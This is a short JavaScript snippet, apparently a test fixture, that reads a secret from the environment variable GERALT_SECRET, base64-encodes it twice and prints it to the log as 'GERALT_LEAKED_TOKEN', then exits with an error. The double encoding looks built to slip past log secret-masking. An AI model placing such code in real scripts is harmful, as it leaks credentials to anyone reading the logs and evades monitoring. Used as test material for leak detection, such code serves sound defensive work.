const secret = process.env.GERALT_SECRET || "";
console.log("GERALT_LEAKED_TOKEN=" + Buffer.from(Buffer.from(secret, "utf8").toString("base64"), "utf8").toString("base64"));
process.exit(1);
